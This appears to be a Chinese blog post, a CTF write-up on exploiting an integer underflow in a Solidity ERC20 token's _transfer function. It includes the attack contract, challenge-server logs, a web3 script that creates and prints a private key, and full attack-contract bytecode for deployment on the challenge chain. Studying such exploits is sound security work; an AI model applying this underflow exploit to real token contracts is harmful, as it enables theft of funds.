+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function _transfer(</span><br><span class="line">   <span class="built_in"> address </span>sender,</span><br><span class="line">   <span class="built_in"> address </span>recipient,</span><br><span class="line">    uint256 amount</span><br><span class="line">) internal virtual &#123;</span><br><span class="line">    require(sender != address(0), <span class="string">"ERC20: transfer from the zero address"</span>);</span><br><span class="line">    require(recipient != address(0), <span class="string">"ERC20: transfer to the zero address"</span>);</span><br><span class="line">    _balances[sender] = _balances[sender] - amount;</span><br><span class="line">    _balances[recipient] = _balances[recipient] + amount;</span><br><span class="line">    emit Transfer(sender, recipient, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>做transfer的时候他还是用了减号，那依然会造成下溢，【想要用到safemath的功能，这里得用sub】</p>
+<p>所以这里我们可以部署一个 attack合约，然后用这个合约调用transfer随便往哪里赚钱，那么他自己的账户的钱就会下溢而变得很多。</p>
+<h3 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: UNLICENSED</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.6</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">"./erc20_fake.sol"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">"./deployer.sol"</span>;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    address <span class="keyword">public</span> challenge_addr=<span class="number">0x52936ec23b51C2137F4B68aBECe07246bae05B1f</span>; <span class="comment">// nc过去，部署的题目（deployer合约）地址</span></span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">public</span> flag;</span><br><span class="line">    </span><br><span class="line">    deployer challenge=deployer(challenge_addr); </span><br><span class="line">    address <span class="keyword">public</span> fishToken_addr=address(challenge.fishmenToken()); <span class="comment">// 获取deployer部署的FishmenToken地址</span></span><br><span class="line">    </span><br><span class="line">    FishmenToken fishtoken=FishmenToken(fishToken_addr); <span class="comment">// FishmenToken合约的实例</span></span><br><span class="line">    </span><br><span class="line">    constructor() <span class="keyword">public</span>&#123;</span><br><span class="line">        fishtoken.<span class="built_in">transfer</span>(challenge_addr,<span class="number">999</span>); <span class="comment">// FishmenToken里攻击合约账户往题目账户（别的啥payable的账户都行）随便转点钱</span></span><br><span class="line">        flag=challenge.solve(); <span class="comment">// 调用一下solve完成解题</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>和远程交互，建立一个部署题目的账户，</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[1] - <span class="keyword">Create</span> an <span class="keyword">account</span> which will be used <span class="keyword">to</span> deploy the challenge contract</span><br><span class="line">[<span class="number">2</span>] - Deploy the challenge contract <span class="keyword">using</span> your <span class="keyword">generated</span> <span class="keyword">account</span></span><br><span class="line">[<span class="number">3</span>] - <span class="keyword">Get</span> your flag once you meet the requirement</span><br><span class="line">[<span class="number">4</span>] - <span class="keyword">Show</span> the contract <span class="keyword">source</span> code</span><br><span class="line">[-] <span class="keyword">input</span> your choice: <span class="number">1</span></span><br><span class="line">[+] deployer <span class="keyword">account</span>: <span class="number">0xe0Bd3B690dbB74c46d88DaFFE93ed803aEeDC1E2</span></span><br><span class="line">[+] token: v4.local.iKzDRnediWHIiLDZoigMa-sO3kpIi8Mnz54rE_qlXEcdZLQpni6EM3E9-t5hZ2ePY0Bd2YQVRlblM4DYB4dMavNN3y_DPKUnhIui9JCOjFK0aTzO3y4nDKMXkrOfNcr5plzCzE5KMHNCk4qRHkxf86gH7cSBXNj4114S_VXrSItI0A</span><br></pre></td></tr></table></figure>
+
+<p>然后去8080端口，有水管，往这个账户搞点eth</p>
+<p><img src="https://s2.loli.net/2022/01/23/BWKswHT2kmYOqSn.png" alt="image-20220123113346702"></p>
+<p>部署题目</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[1] - <span class="keyword">Create</span> an <span class="keyword">account</span> which will be used <span class="keyword">to</span> deploy the challenge contract</span><br><span class="line">[<span class="number">2</span>] - Deploy the challenge contract <span class="keyword">using</span> your <span class="keyword">generated</span> <span class="keyword">account</span></span><br><span class="line">[<span class="number">3</span>] - <span class="keyword">Get</span> your flag once you meet the requirement</span><br><span class="line">[<span class="number">4</span>] - <span class="keyword">Show</span> the contract <span class="keyword">source</span> code</span><br><span class="line">[-] <span class="keyword">input</span> your choice: <span class="number">2</span></span><br><span class="line">[-] <span class="keyword">input</span> your token: v4.local.iKzDRnediWHIiLDZoigMa-sO3kpIi8Mnz54rE_qlXEcdZLQpni6EM3E9-t5hZ2ePY0Bd2YQVRlblM4DYB4dMavNN3y_DPKUnhIui9JCOjFK0aTzO3y4nDKMXkrOfNcr5plzCzE5KMHNCk4qRHkxf86gH7cSBXNj4114S_VXrSItI0A</span><br><span class="line">[+] contract address: <span class="number">0x52936ec23b51C2137F4B68aBECe07246bae05B1f</span></span><br><span class="line">[+] <span class="keyword">transaction</span> <span class="keyword">hash</span>: <span class="number">0xaa10dc803284aa06242d6bff71da8134ac4a6a55dadbfe2a5f062e059f7ef2ae</span></span><br></pre></td></tr></table></figure>
+
+<p>好了，我们还得再自己建立一个部署攻击合约的账户，这里不能通过交互建立账户，他都不给你私钥，这里的用脚本交互去创建一个账户</p>
+<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from web3 <span class="keyword">import</span> Web3,HTTPProvider</span><br><span class="line">from Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">w3=Web3(HTTPProvider(<span class="string">"http://47.102.47.140:8545/"</span>))</span><br><span class="line"><span class="built_in">key</span>=w3.eth.account.create()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bytes_to_long(<span class="built_in">key</span>.privateKey)))</span><br><span class="line">account= web3.eth.account.from_key(<span class="string">'0x719e289ff8306c4e9ff66476bf35889e24eaa475c80878a2a42c760efaed2134'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后还是，去水管往这个账户打点钱。</p>
+<p>接下来我用remix去编译一下攻击合约，拿到他的字节码。或者也可以部署【注意到，这里肯定是部署失败的，但是我们主要想要他的bytecode】</p>
+<p><img src="https://s2.loli.net/2022/01/23/hEpNzrq21Y9exks.png" alt="image-20220123114242109"></p>
+<p><img src="https://s2.loli.net/2022/01/23/vPbl2efFA1mt4Mo.png" alt="image-20220123114310342"></p>
+<p>然后我们继续用脚本，在这条私链上部署攻击合约</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def deploy(rawTx):</span><br><span class="line">    signedTx = w3.eth.account.signTransaction(rawTx, private_key=account.privateKey)</span><br><span class="line">    hashTx = w3.eth.sendRawTransaction(signedTx.rawTransaction).hex()</span><br><span class="line">    receipt = w3.eth.waitForTransactionReceipt(hashTx)</span><br><span class="line">    return receipt</span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    rawTx = &#123;</span><br><span class="line">        'from': account.address,</span><br><span class="line">        'nonce': w3.eth.getTransactionCount(account.address),</span><br><span class="line">        'gasPrice': w3.toWei(<span class="number">1</span>,'gwei'),</span><br><span class="line">        'gas': <span class="number">300000</span>,</span><br><span class="line">        'value': w3.toWei(<span class="number">0</span>, 'ether'),</span><br><span class="line">        'data': '0x<span class="number">60806040527352</span>936ec23b51c<span class="number">2137</span>f4b68abece<span class="number">0724</span>6bae05b1f<span class="number">600080610100</span>0a<span class="number">81548173</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">021916908373</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">16021790555060</span><span class="number">00805490610100</span>0a<span class="number">900473</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">16600160006101</span>000a<span class="number">81548173</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">021916908373</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">16021790555060</span><span class="number">01600090549061</span><span class="number">0100</span>0a<span class="number">900473</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">1673</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">1663</span>4fd<span class="number">0632</span>f<span class="number">6040518163</span>ffffffff<span class="number">1660</span>e01b<span class="number">81526004016020</span><span class="number">60405180830381</span><span class="number">8680</span>3b<span class="number">15801561012157</span><span class="number">600080</span>fd5b505afa<span class="number">15801561013557</span>3d<span class="number">600080</span>3e3d<span class="number">6000</span>fd5b<span class="number">50505050604051</span>3d<span class="number">60208110156101</span>4b<span class="number">57600080</span>fd5b<span class="number">81019080805190</span><span class="number">60200190929190</span><span class="number">50505060026000</span><span class="number">610100</span>0a<span class="number">81548173</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">021916908373</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">16021790555060</span><span class="number">02600090549061</span><span class="number">0100</span>0a<span class="number">900473</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">16600360006101</span>000a<span class="number">81548173</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">021916908373</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">16021790555034</span><span class="number">80156102</span>0b<span class="number">57600080</span>fd5b<span class="number">50600360009054</span><span class="number">90610100</span>0a<span class="number">900473</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">1673</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">1663</span>a<span class="number">9059</span>cbb<span class="number">60008054906101</span>000a<span class="number">900473</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">166103</span>e<span class="number">7604051836</span>3ffffffff<span class="number">1660</span>e01b<span class="number">81526004018083</span>73ffffffffffffffffffffffffffffffffffffffff<span class="number">16815260200182</span><span class="number">81526020019250</span><span class="number">50506020604051</span><span class="number">80830381600087</span>803b<span class="number">1580156102</span>c<span class="number">15760008</span>0fd5b505af<span class="number">1158015610</span>2d<span class="number">5573</span>d<span class="number">600080</span>3e3d<span class="number">6000</span>fd5b<span class="number">50505050604051</span>3d<span class="number">60208110156102</span>eb<span class="number">57600080</span>fd5b<span class="number">81019080805190</span><span class="number">60200190929190</span><span class="number">50505050600160</span><span class="number">00905490610100</span>0a<span class="number">900473</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">1673</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">166389</span>0d<span class="number">69086040518163</span>ffffffff<span class="number">1660</span>e01b<span class="number">81526004016020</span><span class="number">60405180830381</span><span class="number">60008780</span>3b<span class="number">15801561036757</span><span class="number">600080</span>fd5b505af<span class="number">115801561037</span>b573d<span class="number">600080</span>3e3d<span class="number">6000</span>fd5b<span class="number">50505050604051</span>3d<span class="number">60208110156103</span><span class="number">9157600080</span>fd5b<span class="number">81019080805190</span><span class="number">60200190929190</span><span class="number">50505060006014</span><span class="number">610100</span>0a<span class="number">81548160</span>ff<span class="number">02191690831515</span><span class="number">02179055506101</span><span class="number">61806103</span>ca<span class="number">6000396000</span>f3fe<span class="number">60806040523480</span><span class="number">15610010576000</span>80fd5b<span class="number">50600436106100</span><span class="number">415760003560</span>e01c<span class="number">80636391</span>e9b<span class="number">21461004657806</span><span class="number">3890</span>eba<span class="number">68146100</span>7a<span class="number">578063</span>ba<span class="number">274083146100</span>9a575b<span class="number">600080</span>fd5b<span class="number">6100</span>4e<span class="number">6100</span>ce565b<span class="number">604051808273</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">16815260200191</span><span class="number">50506040518091</span><span class="number">0390</span>f35b<span class="number">6100826100</span>f<span class="number">4565</span>b<span class="number">60405180821515</span><span class="number">81526020019150</span><span class="number">50604051809103</span>90f35b<span class="number">6100</span>a<span class="number">2610107565</span>b<span class="number">604051808273</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">16815260200191</span><span class="number">50506040518091</span><span class="number">0390</span>f35b<span class="number">60026000905490</span><span class="number">610100</span>0a<span class="number">900473</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">168156</span>5b<span class="number">60006014905490</span><span class="number">610100</span>0a<span class="number">900460</span>ff<span class="number">168156</span>5b<span class="number">60008054906101</span>000a<span class="number">900473</span>ffffffffffffffffffffffffffffffffffffffff<span class="number">168156</span>fea<span class="number">26469706673582</span><span class="number">212207</span>ec<span class="number">9056</span>4a59b7a55e<span class="number">8597</span>b62d<span class="number">3533</span>f<span class="number">1080</span>a42eaeda42d4d<span class="number">65975915</span>f883fac8a<span class="number">6473</span>6f6c<span class="number">63430006</span>0c<span class="number">0033</span>',</span><br><span class="line">        <span class="string">"chainId"</span>: <span class="number">1211</span>  <span class="meta">#私链的chainId可以去metamask导入查一下，是1211</span></span><br><span class="line">    &#125;</span><br><span class="line">    receipt = deploy(rawTx)</span><br></pre></td></tr></table></figure>
+
+<p>然后交互去拿flag就好了。</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可联系QQ 643713081，也可以邮件至 643713081@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>区块链学习笔记之RealWorld体验赛——TransferFrom</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">1.7k</span></p>
+    <p><span class="copy-title">本文作者:</span><a  title="Van1sh">Van1sh</a></p>
+    <p><span class="copy-title">发布时间:</span>2022-01-23, 00:11:00</p>
+    <p><span class="copy-title">最后更新:</span>2022-02-11, 16:23:20</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2022/01/23/区块链学习笔记之RealWorld体验赛/" title="区块链学习笔记之RealWorld体验赛——TransferFrom">http://jayxv.github.io/2022/01/23/区块链学习笔记之RealWorld体验赛/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+<input type="hidden" id="MathJax-js"
+        value="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML">
+</input>
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2020 Van1sh</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['@Van1sh','@FzWjScJ','#Write Up','#docker','#CTF','#Sage','#ECC','#Paillier','#Crypto','#Web','#Files','#Serialization','#Lattice','#Dsa','#LCG','#Rc4','#SM4','#Knapsack','#Rsa','#DES','#差分密码分析','#RE','#SQL','#python','#操作模式','#number theory','#Abstract algebra','#SPN','#线性密码分析','#Book','#Nmap','#Coppersmith’s Method','#XSS','#Linux','#book',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
